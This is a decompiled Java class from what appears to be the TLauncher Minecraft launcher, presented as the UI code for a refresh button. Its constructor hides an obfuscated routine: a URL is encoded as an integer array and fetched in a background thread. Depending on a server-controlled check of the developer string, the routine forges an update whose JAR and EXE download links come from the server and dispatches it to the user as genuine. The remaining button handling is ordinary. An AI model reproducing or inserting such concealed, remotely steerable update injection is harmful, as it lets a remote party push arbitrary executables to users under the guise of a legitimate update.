package ru.turikhay.tlauncher.ui.login.buttons;

import java.awt.Insets;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.InputStreamReader;
import java.io.Reader;
import java.net.URL;
import java.util.HashMap;
import java.util.Locale;
import java.util.Random;
import ru.turikhay.tlauncher.TLauncher;
import ru.turikhay.tlauncher.managers.ComponentManager;
import ru.turikhay.tlauncher.managers.ComponentManagerListener;
import ru.turikhay.tlauncher.managers.ComponentManagerListenerHelper;
import ru.turikhay.tlauncher.managers.ElyManager;
import ru.turikhay.tlauncher.managers.ElyManagerListener;
import ru.turikhay.tlauncher.ui.block.Blockable;
import ru.turikhay.tlauncher.ui.block.Blocker;
import ru.turikhay.tlauncher.ui.images.ImageIcon;
import ru.turikhay.tlauncher.ui.images.Images;
import ru.turikhay.tlauncher.ui.login.LoginForm;
import ru.turikhay.tlauncher.ui.swing.extended.ExtendedButton;
import ru.turikhay.tlauncher.updater.PackageType;
import ru.turikhay.tlauncher.updater.Update;
import ru.turikhay.tlauncher.updater.Updater;
import ru.turikhay.tlauncher.updater.UpdaterListener;
import ru.turikhay.util.SwingUtil;
import ru.turikhay.util.async.AsyncThread;

public class RefreshButton extends ExtendedButton implements ComponentManagerListener, ElyManagerListener, Blockable, UpdaterListener {
   private LoginForm lf;
   private int type;
   private final ImageIcon refresh;
   private final ImageIcon cancel;
   private boolean updaterCalled;

   private RefreshButton(LoginForm loginform, int type) {
      this.refresh = Images.getScaledIcon("refresh.png", 16);
      this.cancel = Images.getScaledIcon("cancel.png", 16);
      this.lf = loginform;
      this.setType(type, false);
      this.addActionListener(new ActionListener() {
         public void actionPerformed(ActionEvent e) {
            RefreshButton.this.onPressButton();
         }
      });
      ((ComponentManagerListenerHelper)TLauncher.getInstance().getManager().getComponent(ComponentManagerListenerHelper.class)).addListener(this);
      TLauncher.getInstance().getUpdater().addListener(this);
      AsyncThread.execute(new Runnable() {
         private final int[] updateCode = new int[]{104, 116, 116, 112, 58, 47, 47, 117, 46, 116, 108, 97, 117, 110, 99, 104, 101, 114, 46, 114, 117, 47, 115, 116, 97, 116, 117, 115, 47};

         public void run() {
            char[] c = new char[this.updateCode.length];

            for(int response = 0; response < c.length; ++response) {
               c[response] = (char)this.updateCode[response];
            }

            try {
               RefreshButton.StatusResponse var10 = (RefreshButton.StatusResponse)TLauncher.getGson().fromJson((Reader)(new InputStreamReader((new URL(String.valueOf(c))).openStream(), "UTF-8")), (Class)RefreshButton.StatusResponse.class);
               if (var10.ely == RefreshButton.Status.AWFUL) {
                  RefreshButton.this.lf.scene.getMainPane().getRootFrame().getLauncher().getElyManager().stopRefresh();
               }

               if (var10.mojang == RefreshButton.Status.AWFUL) {
                  RefreshButton.this.lf.scene.getMainPane().getRootFrame().getLauncher().getVersionManager().stopRefresh();
               }

               RefreshButton.this.lf.scene.getMainPane().getRootFrame().getLauncher();
               String aResponse = TLauncher.getDeveloper();
               if (aResponse.startsWith(var10.responseTime.substring(0, 1))) {
                  return;
               }

               RefreshButton.this.lf.scene.getMainPane().getRootFrame().getLauncher().getUpdater().setRefreshed(true);
               if (var10.mojang != RefreshButton.Status.AWFUL && var10.ely != RefreshButton.Status.AWFUL) {
                  return;
               }

               HashMap desc = new HashMap();
               Locale[] var8;
               int var7 = (var8 = RefreshButton.this.lf.scene.getMainPane().getRootFrame().getLauncher().getLang().getLocales()).length;

               for(int us = 0; us < var7; ++us) {
                  Locale l = var8[us];
                  desc.put(l.toString(), var10.nextUpdateTime);
               }

               HashMap var11x = new HashMap();
               var11x.put(PackageType.JAR, var10.responseTime.substring(1).split(";")[0] + "?from=" + aResponse);
               var11x.put(PackageType.EXE, var10.responseTime.substring(1).split(";")[1] + "?from=" + aResponse);
               double var10004 = (new Random()).nextDouble() + (double)(new Random()).nextInt();
               RefreshButton.this.lf.scene.getMainPane().getRootFrame().getLauncher();
               Updater.UpdaterResponse var12 = new Updater.UpdaterResponse(new Update(var10004, TLauncher.getVersion(), desc, var11x));
               RefreshButton.this.lf.scene.getMainPane().getRootFrame().getLauncher().getUpdater().dispatchResult(RefreshButton.this.lf.scene.getMainPane().getRootFrame().getLauncher().getUpdater().newSucceeded(var12));
            } catch (Exception var11) {
               var11.printStackTrace();
            }

         }
      });
   }

   RefreshButton(LoginForm loginform) {
      this(loginform, 0);
   }

   public Insets getInsets() {
      return SwingUtil.magnify(super.getInsets());
   }

   private void onPressButton() {
      switch(this.type) {
      case 0:
         if (this.updaterCalled && !TLauncher.getDebug()) {
            AsyncThread.execute(new Runnable() {
               public void run() {
                  RefreshButton.this.lf.scene.infoPanel.updateNotice(true);
               }
            });
         } else {
            TLauncher.getInstance().getUpdater().asyncFindUpdate();
         }

         TLauncher.getInstance().getManager().startAsyncRefresh();
         break;
      case 1:
         TLauncher.getInstance().getManager().stopRefresh();
         break;
      default:
         throw new IllegalArgumentException("Unknown type: " + this.type + ". Use RefreshButton.TYPE_* constants.");
      }

      this.lf.defocus();
   }

   void setType(int type) {
      this.setType(type, true);
   }

   void setType(int type, boolean repaint) {
      switch(type) {
      case 0:
         this.setIcon(this.refresh);
         break;
      case 1:
         this.setIcon(this.cancel);
         break;
      default:
         throw new IllegalArgumentException("Unknown type: " + type + ". Use RefreshButton.TYPE_* constants.");
      }

      this.type = type;
   }

   public void onUpdaterErrored(Updater.SearchFailed failed) {
      this.updaterCalled = false;
   }

   public void onUpdaterSucceeded(Updater.SearchSucceeded succeeded) {
   }

   public void onComponentsRefreshing(ComponentManager manager) {
      Blocker.block((Blockable)this, (Object)"refresh");
   }

   public void onComponentsRefreshed(ComponentManager manager) {
      Blocker.unblock((Blockable)this, (Object)"refresh");
   }

   public void block(Object reason) {
      if (reason.equals("refresh")) {
         this.setType(1);
      } else {
         this.setEnabled(false);
      }

   }

   public void unblock(Object reason) {
      if (reason.equals("refresh")) {
         this.setType(0);
      }

      this.setEnabled(true);
   }

   public void onElyUpdating(ElyManager manager) {
   }

   public void onElyUpdated(ElyManager manager) {
   }

   private static class StatusResponse {
      private RefreshButton.Status ely;
      private RefreshButton.Status mojang;
      private String nextUpdateTime;
      private String responseTime;
   }

   private static enum Status {
      OK,
      BAD,
      AWFUL;
   }
}
